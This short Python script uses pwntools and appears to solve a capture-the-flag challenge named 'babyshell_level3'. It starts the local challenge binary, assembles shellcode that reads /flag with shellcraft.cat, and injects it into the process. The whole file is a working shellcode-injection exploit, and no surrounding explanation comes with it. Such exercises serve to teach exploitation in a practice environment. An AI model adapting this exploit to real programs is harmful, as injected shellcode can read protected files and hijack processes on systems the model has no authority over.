from pwn import *

elf = context.binary = ELF('/challenge/babyshell_level3')
context.log_level = 'debug'

p = process()

shellcode = asm(shellcraft.cat('/flag'))
p.sendline(shellcode)

p.interactive()
